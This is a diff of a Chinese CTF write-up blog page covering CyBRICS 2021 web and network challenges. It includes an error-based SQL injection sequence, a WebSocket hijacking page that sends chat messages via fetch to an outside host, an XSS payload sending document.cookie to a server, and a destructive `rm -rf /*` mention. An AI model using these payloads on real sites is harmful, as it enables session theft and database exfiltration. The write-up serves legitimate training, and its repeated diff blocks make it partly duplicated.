-                <span style=color:#75af00>fetch</span><span style=color:#111>(</span><span style=color:#d88200>&#34;http://api.chara.pub:1337/aaa.txt?&#34;</span><span style=color:#f92672>+</span><span style=color:#111>encodeURIComponent</span><span style=color:#111>(</span><span style=color:#d88200>&#34;connected&#34;</span><span style=color:#111>))</span>
-            <span style=color:#111>};</span>
-            <span style=color:#75af00>conn</span><span style=color:#111>.</span><span style=color:#75af00>onmessage</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>function</span> <span style=color:#111>(</span><span style=color:#75af00>evt</span><span style=color:#111>)</span> <span style=color:#111>{</span>
-                <span style=color:#75af00>fetch</span><span style=color:#111>(</span><span style=color:#d88200>&#34;http://api.chara.pub:1337/aaa.txt?&#34;</span><span style=color:#f92672>+</span><span style=color:#111>encodeURIComponent</span><span style=color:#111>(</span><span style=color:#75af00>evt</span><span style=color:#111>.</span><span style=color:#75af00>data</span><span style=color:#111>))</span>
-            <span style=color:#111>};</span>
-            <span style=color:#00a8c8>function</span> <span style=color:#75af00>b</span><span style=color:#111>(){</span>
-                <span style=color:#75af00>conn</span><span style=color:#111>.</span><span style=color:#75af00>send</span><span style=color:#111>(</span><span style=color:#d88200>&#34;Hey, i forgot the flag. Can you remind me?&#34;</span><span style=color:#111>)</span>
-            <span style=color:#111>}</span>
-            <span style=color:#75af00>setTimeout</span><span style=color:#111>(</span><span style=color:#75af00>b</span><span style=color:#111>,</span><span style=color:#ae81ff>2000</span><span style=color:#111>);</span>
-    <span style=color:#111>}</span>
-    <span style=color:#111>window</span><span style=color:#111>.</span><span style=color:#75af00>onload</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>function</span> <span style=color:#111>()</span> <span style=color:#111>{</span>
-        <span style=color:#75af00>connect</span><span style=color:#111>();</span>
-    <span style=color:#111>};</span>
-<span style=color:#111>&lt;/</span><span style=color:#f92672>script</span><span style=color:#111>&gt;</span>
-<span style=color:#111>&lt;/</span><span style=color:#f92672>body</span><span style=color:#111>&gt;</span>
-<span style=color:#111>&lt;</span><span style=color:#f92672>html</span><span style=color:#111>&gt;</span>
-</code></pre></div><p>或者非预期解：在url部分进行xss，payload: <code>javascript:location.href='http://vps/?cookie='+document.cookie</code>（此处用的是burp collaborator）直接可以获取房间号，连入房间后发消息即可拿到flag</p>
-<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729144122926.png alt=image-20210729144122926></p>
-<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729143946243.png alt=image-20210729143946243></p>
-<p>参考：<a href=https://www.runoob.com/html/html5-websocket.html>HTML5 WebSocket</a> | <a href=https://wiki.wgpsec.org/knowledge/web/websocket-sec.html>WebSocket安全问题分析</a> <a href=https://segmentfault.com/a/1190000014582485>WebSocket断开原因分析</a> | <a href=https://developer.mozilla.org/zh-CN/docs/Web/API/Request/mode>Request.mode</a> <a href=https://developer.mozilla.org/zh-CN/docs/Web/API/Fetch_API/Using_Fetch>使用 Fetch</a> | <a href=https://developer.mozilla.org/zh-CN/docs/Web/API/WindowOrWorkerGlobalScope/fetch>WorkerOrGlobalScope.fetch()</a> | <a href=https://www.freebuf.com/news/193447.html>Burpsuite Collaborator模块详解</a> | <a href=https://blog.fabiopires.pt/running-your-instance-of-burp-collaborator-server/>Running Your Instance of Burp Collaborator Server</a>（列入待完成计划</p>
-<h2 id=ascii-terminal-network-baby-116-pts>ASCII Terminal (Network, Baby, 116 pts)</h2>
-<blockquote>
-<p>Author: Artur Khanov (<a href=https://t.me/awengar>@awengar</a>)</p>
-<p>At <code>138.68.83.253:3333</code> you have an ASCII terminal. It really works, check with the <a href=https://cybrics.net/files/id.txt><strong>id command</strong></a></p>
-</blockquote>
-<p>nc连上以后可以看到一个bash $，题目的提示是"ASCII termial"</p>
-<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210728231402633.png alt=image-20210728231402633></p>
-<p>把要执行的命令也表示成这种形式后发送即可，这里使用的是linux下的toilet工具</p>
-<p>toilet可以把字母拼成用字符或其他方式表示的更大的字母，可以带一些参数来控制字体 字号以及样式 比如</p>
-<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210728234413850.png alt=image-20210728234413850></p>
-<p>可以玩出很多花样~</p>
-<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210728234351668.png alt=image-20210728234351668></p>
-<p>书归正题，这里使用<code>toilet -f bigascii9 +command</code>的命令生成结果，将空格换为 <code>.</code>再发送即可</p>
-<pre tabindex=0><code>toilet -f bigascii9 ls &gt; ls.txt
+</code></pre><p>Rescue the <strong>flag.txt</strong> file from one of the directories by only using your shell</p><p><strong>Added at 13:45 —</strong> frequent question: yes, if you found <code>flag.txt</code>, the flag is right there, in the open, as plain text. Just read it. If you’re not seeing the flag, try to find another method that will not hide info from you</p></blockquote><p>这个题 emmmmm
+只要ssh一连接就会自动执行<code>rm -rf /*</code>的指令，当反应过来的时候系统已经删的连ls指令都不剩了</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729003620922.png alt=image-20210729003620922></p><p>先说非预期解吧：当输入连接密码后立刻ctrl+c 只要够快 就执行不了<code>rm -rf /*</code>，之后就可以顺畅的穿梭于这个buildbox之间拿flag了</p><p>预期解则是这样的：当系统执行删除命令后 很多外部指令都被删除 需要通过仅剩的一些内置函数完成"read"的功能；从之前的报错信息可知 buildbox使用的是tcsh，在tcsh中<code>echo $&lt;</code>命令相当于<code>read</code>函数，读入标准输入并输出；tcsh中加括号的命令都会在子shell中运行；构造payload <code>(echo "$&lt;") &lt; /etc/ctf/flag.txt</code>，即 读取flag.txt并输出</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729005544665.png alt=image-20210729005544665></p><h2 id=ad-network-web-baby-50-pts>Ad Network (Web, Baby, 50 pts)</h2><blockquote><p>Author: Alexander Menshchikov (<a href=https://t.me/n0str>@n0str</a>)</p><p>We are so tired of advertising on the internet. It feels like it breaks the internet. Try to follow the ad, try to follow its rules.</p><p><a href=http://adnetwork-cybrics2021.ctf.su/>Adnetwork website</a></p><p>There is a flag 1337 redirects deep into the network&mldr;</p></blockquote><p><del>这个我是不知道怎么做……页面上的任何链接部分都是自己页面内的跳转，提示的是redirect重定向，可是抓包后没有302 也没有一直在做重定向呀 要怎么看呢？</del></p><p>emmmm 在比赛第二天再次尝试的时候用burp的自带的chromium的浏览器（之前是知道这个 但是没有用过）欸 页面左上角显示了一个gif图
+这个图在昨天做的时候看到， 内容是 <em>awesome ad from adnetwork</em>，但是edge浏览器在加载这个图的时候会自动阻止 我单独看了内容也没发现什么特别的 就没有注意这里。事后角度看这里 其实一个Gif图被阻止请求应该是很反常的事情，应该首先引起注意的&mldr;&mldr; <del>（都怪edge!!!</del></p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210725133924877.png alt=image-20210725133924877></p><p>点击gif会有单独的弹窗出来，提示重定向次数过多；看burp中的抓包记录 确实多的离谱，按照题目中的提示 得有1337层，得上个脚本慢慢跑了 这个比较好弄</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210725134346221.png alt=image-20210725134346221></p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>requests</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#111>url</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;http://adnetwork-cybrics2021.ctf.su/adnetwork&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#00a8c8>for</span> <span style=color:#111>_</span> <span style=color:#f92672>in</span> <span style=color:#111>range</span><span style=color:#111>(</span><span style=color:#ae81ff>1337</span><span style=color:#111>):</span>
+</span></span><span style=display:flex><span>	<span style=color:#111>r</span> <span style=color:#f92672>=</span> <span style=color:#111>requests</span><span style=color:#f92672>.</span><span style=color:#111>get</span><span style=color:#111>(</span><span style=color:#111>url</span><span style=color:#111>,</span> <span style=color:#111>allow_redirects</span><span style=color:#f92672>=</span><span style=color:#00a8c8>False</span><span style=color:#111>)</span>
+</span></span><span style=display:flex><span>    <span style=color:#111>url</span> <span style=color:#f92672>=</span> <span style=color:#111>r</span><span style=color:#f92672>.</span><span style=color:#111>text</span><span style=color:#111>[</span><span style=color:#ae81ff>9</span><span style=color:#111>:</span><span style=color:#f92672>-</span><span style=color:#ae81ff>18</span><span style=color:#111>]</span>
+</span></span><span style=display:flex><span><span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>url</span><span style=color:#111>)</span>
+</span></span></code></pre></div><p>emmm 比较慢其实 应该有别的的方式？最后的flag是 cybrics{f0lL0w_RUl3Z_F0ll0W_r3d1r3C7z}</p><p>比赛完了看了别的wp 这块可以用session设允许重定向的次数，这样更方便</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>requests</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#111>session</span> <span style=color:#f92672>=</span> <span style=color:#111>requests</span><span style=color:#f92672>.</span><span style=color:#111>Session</span><span style=color:#111>()</span>
+</span></span><span style=display:flex><span><span style=color:#111>session</span><span style=color:#f92672>.</span><span style=color:#111>max_redirects</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>1337</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#111>url</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;http://adnetwork-cybrics2021.ctf.su/adnetwork&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#111>r</span> <span style=color:#f92672>=</span> <span style=color:#111>session</span><span style=color:#f92672>.</span><span style=color:#111>get</span><span style=color:#111>(</span><span style=color:#111>url</span><span style=color:#111>,</span> <span style=color:#111>allow_redirects</span><span style=color:#f92672>=</span><span style=color:#00a8c8>True</span><span style=color:#111>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>r</span><span style=color:#f92672>.</span><span style=color:#111>text</span><span style=color:#111>)</span>
+</span></span><span style=display:flex><span><span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>r</span><span style=color:#f92672>.</span><span style=color:#111>url</span><span style=color:#111>)</span>
+</span></span></code></pre></div><h2 id=announcement-web-easy-60-pts>Announcement (Web, Easy, 60 pts)</h2><blockquote><p>Author: Alexander Menshchikov (<a href=https://t.me/n0str>@n0str</a>)</p><p>Ladies and gentlemen!</p><p>Allow us to introduce a brand new project —
+⚐ The Flag</p><p><a href=http://announcement-cybrics2021.ctf.su/>Announcement website</a></p></blockquote><p>简约漂亮的前端</p><p>有个输入邮箱的框，提交会发送一个post请求：digest=xxxx&email=xxxx
+尝试一个1@1.com，重放的时候直接修改email值会提示Invalid digest，发现其中digest的值就是md5(&lsquo;<a href=mailto:1@1.com>1@1.com</a>&rsquo;) 随email而改变，尝试注入</p><pre tabindex=0><code>digest=76af11f3eaf7b12e72d7d88e4cf2ee01&amp;email=&#39;or&#39;1		// 回显正常 无报错
+digest=c3593d255957d60d5d489ae682da8aee&amp;email=1&#39;)#		// 报错：Something went wrong during database insert: Column count doesn&#39;t match value count at row 1
+digest=5c07c683d062d17ec799fa177ce88058&amp;email=1&#39;,1)#	// 报错：Something went wrong during database insert: Incorrect datetime value: &#39;1&#39; for column &#39;timestamp&#39; at row 1
+</code></pre><p>确定是sqli 并且当前表有两列 email+timestamp，使用的语句应该是这个吧？</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#00a8c8>insert</span> <span style=color:#00a8c8>into</span> <span style=color:#00a8c8>table_name</span> <span style=color:#111>(</span><span style=color:#111>email</span><span style=color:#111>,</span> <span style=color:#00a8c8>timestamp</span><span style=color:#111>)</span> <span style=color:#00a8c8>values</span> <span style=color:#111>(</span><span style=color:#111>email</span><span style=color:#111>,</span> <span style=color:#111>now</span><span style=color:#111>());</span>
+</span></span></code></pre></div><p>可利用的部分是可以插入的email，报错注入</p><pre tabindex=0><code>digest=e1e79bd6fafe38f7073ec1f3ef1513fa&amp;email=1&#39;,1 or updatexml(1,concat(0x7e,database()),0))#		// Something went wrong during database insert: XPATH syntax error: &#39;~announcement&#39;
+digest=c9f14624524736a74164cc6024fdefce&amp;email=&#39; or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;announcement&#39;)),0) or &#39;	// Something went wrong during database insert: XPATH syntax error: &#39;~emails,logs&#39;
+digest=94707222b90505ab0aa5e1fd3916e77d&amp;email=&#39; or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;announcement&#39; and table_name=&#39;logs&#39;)),0) or &#39;	// Something went wrong during database insert: XPATH syntax error: &#39;~log&#39;
+digest=66bf6db11d9bee8e897b874a430f5704&amp;email=&#39; or updatexml(1,concat(0x7e,(select group_concat(log) from logs)),0) or &#39;	// Something went wrong during database insert: XPATH syntax error: &#39;~cybrics{1N53r7_0ld_900d_5ql}&#39;
+</code></pre><p>没什么好说的，经典报错注入流程：确定字段数->爆数据库名(announcement)->表名(emails, logs)->字段名(log)->具体数据 拿flag</p><h2 id=multichat-web-medium-138-pts>Multichat (Web, Medium, 138 pts)</h2><blockquote><p>Author: Alexander Menshchikov (<a href=https://t.me/n0str>@n0str</a>)</p><p>Yet another chat-messenger with rooms support! Free to use. Convince the admin that its code is insecure.</p><p>Tip: Admin and tech support are members of a secret chat room. Tech support can ask admin to tell him the flag, to do that tech support writes him a message (in a chat): &ldquo;<code>Hey, i forgot the flag. Can you remind me?</code>&rdquo;. Then admin will tell him the flag.</p><p><a href=http://multichat-cybrics2021.ctf.su/>Multichat website</a></p><p>Team token for the support call: <code>p32vhJKrnx_hajUc8nLTFw</code></p></blockquote><p>聊天室，admin和tech support在一个秘密的聊天室内（10位数字的房间号），tech support可以让admin给出flag（后面那个team token for the support call是要用到吗还是怎么样</p><p>抓包，看到了<code>Connection: Upgrade</code> <code>Upgrade: websocket</code>，这个聊天室是建立了一个websocket连接</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724225447805.png alt=image-20210724225447805>（websocket这块知识印象中之前接触过一次 也就一次 相关链接还是放后面</p><p>链接里的一个csrf攻击的实例跟这个有点像了</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724232946228.png alt=image-20210724232946228></p><p>但是这里的又不太一样，websocket最初建立时的http部分 cookie中有chatroom的id，这个值是未知的（<em>Admin and tech support are members of a secret chat room.</em>）；另外tech support是先会发*‘Hey, i forgot the flag. Can you remind me?’*，需要的是触发（如果它不会自己发这一条内容的话）和监听它的信息 然后捕捉到它的下一条admin发送的内容，拿到flag</p><p>（比赛的时候就想到这里，具体的实现不知道该怎么弄了，以下是看了wp之后的复现）</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210728001013129.png alt=image-20210728001013129></p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210728001122843.png alt=image-20210728001122843></p><p>5000端口处有Support页面，tech support在这里可以访问任意的页面并建立websocket发送消息，不限制跨域 所以可以将自己的网站写到这里，support会带着它的cookie（和admin在一个房间里 cookie是房间id）过来访问，然后借助js的脚本拿到它的cookie；以下是<a href=https://mp.weixin.qq.com/s/SQ-DGvug-P6PK-s3qkJVdw>来自w&m的脚本</a></p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span><span style=color:#111>&lt;</span><span style=color:#f92672>html</span><span style=color:#111>&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#111>&lt;</span><span style=color:#f92672>head</span><span style=color:#111>&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#111>&lt;/</span><span style=color:#f92672>head</span><span style=color:#111>&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#111>&lt;</span><span style=color:#f92672>body</span><span style=color:#111>&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#111>&lt;</span><span style=color:#f92672>script</span> <span style=color:#75af00>type</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;text/javascript&#34;</span><span style=color:#111>&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#00a8c8>var</span> <span style=color:#75af00>conn</span><span style=color:#111>;</span>
+</span></span><span style=display:flex><span>    <span style=color:#00a8c8>function</span> <span style=color:#75af00>connect</span><span style=color:#111>()</span> <span style=color:#111>{</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            <span style=color:#75af00>conn</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#75af00>WebSocket</span><span style=color:#111>(</span><span style=color:#d88200>&#34;ws://multichat-cybrics2021.ctf.su/ws&#34;</span><span style=color:#111>);</span>
+</span></span><span style=display:flex><span>            <span style=color:#75af00>conn</span><span style=color:#111>.</span><span style=color:#75af00>onclose</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>function</span> <span style=color:#111>(</span><span style=color:#75af00>evt</span><span style=color:#111>)</span> <span style=color:#111>{</span>
+</span></span><span style=display:flex><span>                <span style=color:#00a8c8>var</span> <span style=color:#75af00>item</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;&#34;</span><span style=color:#111>;</span>
+</span></span><span style=display:flex><span>                <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#75af00>evt</span><span style=color:#111>.</span><span style=color:#75af00>code</span> <span style=color:#f92672>===</span> <span style=color:#ae81ff>1003</span><span style=color:#111>)</span> <span style=color:#111>{</span>
+</span></span><span style=display:flex><span>                    <span style=color:#75af00>item</span> <span style=color:#f92672>=</span> <span style=color:#d88200>`Status: </span><span style=color:#d88200>${</span><span style=color:#75af00>evt</span><span style=color:#111>.</span><span style=color:#75af00>reason</span><span style=color:#d88200>}</span><span style=color:#d88200>`</span><span style=color:#111>;</span>
+</span></span><span style=display:flex><span>                <span style=color:#111>}</span> <span style=color:#00a8c8>else</span> <span style=color:#111>{</span>
+</span></span><span style=display:flex><span>                    <span style=color:#75af00>item</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;Connection closed.&#34;</span><span style=color:#111>;</span>
+</span></span><span style=display:flex><span>                <span style=color:#111>}</span>
+</span></span><span style=display:flex><span>                <span style=color:#75af00>fetch</span><span style=color:#111>(</span><span style=color:#d88200>&#34;http://api.chara.pub:1337/aaa.txt?&#34;</span><span style=color:#f92672>+</span><span style=color:#111>encodeURIComponent</span><span style=color:#111>(</span><span style=color:#75af00>item</span><span style=color:#111>))</span>
+</span></span><span style=display:flex><span>            <span style=color:#111>};</span>
+</span></span><span style=display:flex><span>            <span style=color:#75af00>conn</span><span style=color:#111>.</span><span style=color:#75af00>onopen</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>function</span> <span style=color:#111>(</span><span style=color:#75af00>evt</span><span style=color:#111>)</span> <span style=color:#111>{</span>
+</span></span><span style=display:flex><span>                <span style=color:#75af00>fetch</span><span style=color:#111>(</span><span style=color:#d88200>&#34;http://api.chara.pub:1337/aaa.txt?&#34;</span><span style=color:#f92672>+</span><span style=color:#111>encodeURIComponent</span><span style=color:#111>(</span><span style=color:#d88200>&#34;connected&#34;</span><span style=color:#111>))</span>
+</span></span><span style=display:flex><span>            <span style=color:#111>};</span>
+</span></span><span style=display:flex><span>            <span style=color:#75af00>conn</span><span style=color:#111>.</span><span style=color:#75af00>onmessage</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>function</span> <span style=color:#111>(</span><span style=color:#75af00>evt</span><span style=color:#111>)</span> <span style=color:#111>{</span>
+</span></span><span style=display:flex><span>                <span style=color:#75af00>fetch</span><span style=color:#111>(</span><span style=color:#d88200>&#34;http://api.chara.pub:1337/aaa.txt?&#34;</span><span style=color:#f92672>+</span><span style=color:#111>encodeURIComponent</span><span style=color:#111>(</span><span style=color:#75af00>evt</span><span style=color:#111>.</span><span style=color:#75af00>data</span><span style=color:#111>))</span>
+</span></span><span style=display:flex><span>            <span style=color:#111>};</span>
+</span></span><span style=display:flex><span>            <span style=color:#00a8c8>function</span> <span style=color:#75af00>b</span><span style=color:#111>(){</span>
+</span></span><span style=display:flex><span>                <span style=color:#75af00>conn</span><span style=color:#111>.</span><span style=color:#75af00>send</span><span style=color:#111>(</span><span style=color:#d88200>&#34;Hey, i forgot the flag. Can you remind me?&#34;</span><span style=color:#111>)</span>
+</span></span><span style=display:flex><span>            <span style=color:#111>}</span>
+</span></span><span style=display:flex><span>            <span style=color:#75af00>setTimeout</span><span style=color:#111>(</span><span style=color:#75af00>b</span><span style=color:#111>,</span><span style=color:#ae81ff>2000</span><span style=color:#111>);</span>
+</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
+</span></span><span style=display:flex><span>    <span style=color:#111>window</span><span style=color:#111>.</span><span style=color:#75af00>onload</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>function</span> <span style=color:#111>()</span> <span style=color:#111>{</span>
+</span></span><span style=display:flex><span>        <span style=color:#75af00>connect</span><span style=color:#111>();</span>
+</span></span><span style=display:flex><span>    <span style=color:#111>};</span>
+</span></span><span style=display:flex><span><span style=color:#111>&lt;/</span><span style=color:#f92672>script</span><span style=color:#111>&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#111>&lt;/</span><span style=color:#f92672>body</span><span style=color:#111>&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#111>&lt;</span><span style=color:#f92672>html</span><span style=color:#111>&gt;</span>
+</span></span></code></pre></div><p>或者非预期解：在url部分进行xss，payload: <code>javascript:location.href='http://vps/?cookie='+document.cookie</code>（此处用的是burp collaborator）直接可以获取房间号，连入房间后发消息即可拿到flag</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729144122926.png alt=image-20210729144122926></p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729143946243.png alt=image-20210729143946243></p><p>参考：<a href=https://www.runoob.com/html/html5-websocket.html>HTML5 WebSocket</a> | <a href=https://wiki.wgpsec.org/knowledge/web/websocket-sec.html>WebSocket安全问题分析</a> <a href=https://segmentfault.com/a/1190000014582485>WebSocket断开原因分析</a> | <a href=https://developer.mozilla.org/zh-CN/docs/Web/API/Request/mode>Request.mode</a> <a href=https://developer.mozilla.org/zh-CN/docs/Web/API/Fetch_API/Using_Fetch>使用 Fetch</a> | <a href=https://developer.mozilla.org/zh-CN/docs/Web/API/WindowOrWorkerGlobalScope/fetch>WorkerOrGlobalScope.fetch()</a> | <a href=https://www.freebuf.com/news/193447.html>Burpsuite Collaborator模块详解</a> | <a href=https://blog.fabiopires.pt/running-your-instance-of-burp-collaborator-server/>Running Your Instance of Burp Collaborator Server</a>（列入待完成计划</p><h2 id=ascii-terminal-network-baby-116-pts>ASCII Terminal (Network, Baby, 116 pts)</h2><blockquote><p>Author: Artur Khanov (<a href=https://t.me/awengar>@awengar</a>)</p><p>At <code>138.68.83.253:3333</code> you have an ASCII terminal. It really works, check with the <a href=https://cybrics.net/files/id.txt><strong>id command</strong></a></p></blockquote><p>nc连上以后可以看到一个bash $，题目的提示是"ASCII termial"</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210728231402633.png alt=image-20210728231402633></p><p>把要执行的命令也表示成这种形式后发送即可，这里使用的是linux下的toilet工具</p><p>toilet可以把字母拼成用字符或其他方式表示的更大的字母，可以带一些参数来控制字体 字号以及样式 比如</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210728234413850.png alt=image-20210728234413850></p><p>可以玩出很多花样~</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210728234351668.png alt=image-20210728234351668></p><p>书归正题，这里使用<code>toilet -f bigascii9 +command</code>的命令生成结果，将空格换为 <code>.</code>再发送即可</p><pre tabindex=0><code>toilet -f bigascii9 ls &gt; ls.txt
 cat ls.txt | nc 138.68.83.253 3333 &gt; ls_result.txt
-toilet -f bigascii9 'cat flag.txt' &gt; cat.txt
+toilet -f bigascii9 &#39;cat flag.txt&#39; &gt; cat.txt
 cat cat.txt | nc 138.68.83.253 2333 &gt; flag.txt
-</code></pre><p>（值得注意的是 如果直接使用上面的命令生成相应文件后用vim编辑器的<code>%s/\s/./g</code>命令来进行空格的替换，会出现下面这样的情况 首部和尾部都需要手动修正一下</p>
-<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729002105318.png alt=image-20210729002105318></p>
-<p>最后flag：cybrics{T3553R4C7_15_GOOD}</p>
-<p>————ps：在赛后的官方youtube直播讲解中展示了这个ascii terminal的源码，是使用python编写的 对这个terminal的运行感兴趣的可以到<a href="https://www.youtube.com/watch?v=SFnj6DRTIzE&t=2605s">录播视频</a>中看</p>
-<p>参考：<a href=https://www.shuzhiduo.com/A/RnJW9QLBdq/>调皮捣蛋的Linux下有趣终端的合集</a> | <a href=https://www.howtoing.com/create-ascii-text-banners-in-linux-terminal>Linux Fun - 如何在终端中创建ASCII文本横幅</a> | <a href=https://www.howtoing.com/neofetch-shows-linux-system-information-with-logo/>Neofetch - 显示具有分发标志的Linux系统信息</a></p>
-<h2 id=lx-100-network-easy-192-pts>LX-100 (Network, Easy, 192 pts)</h2>
-<blockquote>
-<p>Author: Vlad Roskov (<a href=https://t.me/mrvos>@mrvos</a>)</p>
-<p>We were sitting at an SPbCTF meetup and tried to sniff some Wi-Fi traffic. Lol imagine, they have a DSLR camera that can broadcast a Wi-Fi access point.</p>
-<p>Anyway, we were discussing CyBRICS flags there, hope there’s no way to leak them.</p>
-<p><a href=https://cybrics.net/files/lx100.pcap><strong>lx100.pcap</strong></a></p>
-</blockquote>
-<p>（说实话，pacp包是真的不会看TAT</p>
-<p>首先看到有HTTP的流量，访问的是http://192.168.54.1/cam.cgi?mode=getstate，这是Lumix GX80摄像头，视频流通过UDP传输；追踪UDP流量，导出流量 并批量提取出其中的jpg文件
-（以下是官方给出的解 使用了tshark工具（即命令行版的wireshrk（但是这种方法本地复现失败 导出的jpg无法正常解析 但是<a href="https://www.youtube.com/watch?v=Sf_0f8PWNuI&t=80s">官方视频中</a>确实这样可以成功 emmmm</p>
-<pre tabindex=0><code>tshark -r lx100.pcap -Y  'udp.dstport == 60524' -Tfields -e data.data &gt; hex.txt
+</code></pre><p>（值得注意的是 如果直接使用上面的命令生成相应文件后用vim编辑器的<code>%s/\s/./g</code>命令来进行空格的替换，会出现下面这样的情况 首部和尾部都需要手动修正一下</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729002105318.png alt=image-20210729002105318></p><p>最后flag：cybrics{T3553R4C7_15_GOOD}</p><p>————ps：在赛后的官方youtube直播讲解中展示了这个ascii terminal的源码，是使用python编写的 对这个terminal的运行感兴趣的可以到<a href="https://www.youtube.com/watch?v=SFnj6DRTIzE&t=2605s">录播视频</a>中看</p><p>参考：<a href=https://www.shuzhiduo.com/A/RnJW9QLBdq/>调皮捣蛋的Linux下有趣终端的合集</a> | <a href=https://www.howtoing.com/create-ascii-text-banners-in-linux-terminal>Linux Fun - 如何在终端中创建ASCII文本横幅</a> | <a href=https://www.howtoing.com/neofetch-shows-linux-system-information-with-logo/>Neofetch - 显示具有分发标志的Linux系统信息</a></p><h2 id=lx-100-network-easy-192-pts>LX-100 (Network, Easy, 192 pts)</h2><blockquote><p>Author: Vlad Roskov (<a href=https://t.me/mrvos>@mrvos</a>)</p><p>We were sitting at an SPbCTF meetup and tried to sniff some Wi-Fi traffic. Lol imagine, they have a DSLR camera that can broadcast a Wi-Fi access point.</p><p>Anyway, we were discussing CyBRICS flags there, hope there’s no way to leak them.</p><p><a href=https://cybrics.net/files/lx100.pcap><strong>lx100.pcap</strong></a></p></blockquote><p>（说实话，pacp包是真的不会看TAT</p><p>首先看到有HTTP的流量，访问的是http://192.168.54.1/cam.cgi?mode=getstate，这是Lumix GX80摄像头，视频流通过UDP传输；追踪UDP流量，导出流量 并批量提取出其中的jpg文件
+（以下是官方给出的解 使用了tshark工具（即命令行版的wireshrk（但是这种方法本地复现失败 导出的jpg无法正常解析 但是<a href="https://www.youtube.com/watch?v=Sf_0f8PWNuI&t=80s">官方视频中</a>确实这样可以成功 emmmm</p><pre tabindex=0><code>tshark -r lx100.pcap -Y  &#39;udp.dstport == 60524&#39; -Tfields -e data.data &gt; hex.txt
 php -a
-foreach(file(&quot;hex.txt&quot;)as $i =&gt; $ln) {file_put_contents(&quot;frame$i.jpg&quot;,hex2bin(trim($ln)));}
-</code></pre><p>（以下是在<a href=https://scavengersecurity.com/posts/cybrics-lx100/>别的wp</a>中看到的py脚本： 可成功复现 导出455张jpg图</p>
